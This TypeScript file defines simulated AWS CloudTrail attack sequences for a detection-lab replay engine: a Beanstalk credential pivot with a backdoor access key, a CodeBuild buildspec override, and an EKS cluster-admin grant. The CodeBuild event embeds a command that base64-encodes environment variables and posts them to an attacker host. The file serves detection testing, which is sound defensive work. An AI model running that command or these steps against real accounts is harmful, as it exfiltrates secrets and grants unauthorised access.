/**
 * Attack sequences for Detection Lab Attack Replay Engine.
 * Each step is a CloudTrail event; replay runs sequentially.
 */

export interface AttackSequence {
  id: string;
  name: string;
  description: string;
  steps: Record<string, unknown>[];
  expectedDetectionAtStep?: number;
}

const beanstalkPivotSteps: Record<string, unknown>[] = [
  {
    eventVersion: "1.08",
    eventSource: "elasticbeanstalk.amazonaws.com",
    eventName: "DescribeConfigurationSettings",
    eventTime: "2025-02-10T14:00:00Z",
    userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" },
    requestParameters: { applicationName: "prod-app", environmentName: "prod-env" },
    sourceIPAddress: "203.0.113.10",
  },
  {
    eventVersion: "1.08",
    eventSource: "iam.amazonaws.com",
    eventName: "CreateAccessKey",
    eventTime: "2025-02-10T14:00:30Z",
    userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" },
    requestParameters: { userName: "backdoor" },
    sourceIPAddress: "203.0.113.10",
  },
  {
    eventVersion: "1.08",
    eventSource: "sts.amazonaws.com",
    eventName: "AssumeRole",
    eventTime: "2025-02-10T14:01:00Z",
    userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" },
    requestParameters: { roleArn: "arn:aws:iam::123456789012:role/AdminRole" },
    sourceIPAddress: "203.0.113.10",
  },
];

const codebuildExfilSteps: Record<string, unknown>[] = [
  {
    eventVersion: "1.08",
    eventSource: "codebuild.amazonaws.com",
    eventName: "StartBuild",
    eventTime: "2025-02-10T14:05:00Z",
    userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" },
    requestParameters: {
      projectName: "target",
      buildspecOverride: "version: 0.2\nphases:\n  build:\n    commands:\n      - env | base64 | curl -d @- http://attacker.com",
      environmentVariablesOverride: [{ name: "EXFIL", value: "true", type: "PLAINTEXT" }],
    },
    sourceIPAddress: "203.0.113.10",
  },
  {
    eventVersion: "1.08",
    eventSource: "secretsmanager.amazonaws.com",
    eventName: "GetSecretValue",
    eventTime: "2025-02-10T14:05:20Z",
    userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/CodeBuildServiceRole/session" },
    requestParameters: { secretId: "prod/api-keys" },
    sourceIPAddress: "10.0.1.50",
  },
];

const eksAccessSteps: Record<string, unknown>[] = [
  {
    eventVersion: "1.08",
    eventSource: "eks.amazonaws.com",
    eventName: "CreateAccessEntry",
    eventTime: "2025-02-10T14:10:00Z",
    userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" },
    requestParameters: { clusterName: "prod", principalArn: "arn:aws:iam::123456789012:user/attacker" },
    sourceIPAddress: "203.0.113.10",
  },
  {
    eventVersion: "1.08",
    eventSource: "eks.amazonaws.com",
    eventName: "AssociateAccessPolicy",
    eventTime: "2025-02-10T14:10:05Z",
    userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" },
    requestParameters: {
      clusterName: "prod",
      principalArn: "arn:aws:iam::123456789012:user/attacker",
      policyArn: "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy",
      accessScope: { type: "cluster" },
    },
    sourceIPAddress: "203.0.113.10",
  },
];

export const attackSequences: AttackSequence[] = [
  {
    id: "beanstalk_credential_pivot",
    name: "Beanstalk Credential Pivot",
    description: "DescribeConfigurationSettings → CreateAccessKey → AssumeRole",
    steps: beanstalkPivotSteps,
    expectedDetectionAtStep: 2,
  },
  {
    id: "codebuild_exfiltration",
    name: "CodeBuild Credential Exfiltration",
    description: "StartBuild with override → GetSecretValue by build role",
    steps: codebuildExfilSteps,
    expectedDetectionAtStep: 1,
  },
  {
    id: "eks_access_entry",
    name: "EKS Access Entry Creation",
    description: "CreateAccessEntry → AssociateAccessPolicy",
    steps: eksAccessSteps,
    expectedDetectionAtStep: 2,
  },
];

export function getAttackSequenceById(id: string): AttackSequence | undefined {
  return attackSequences.find((s) => s.id === id);
}
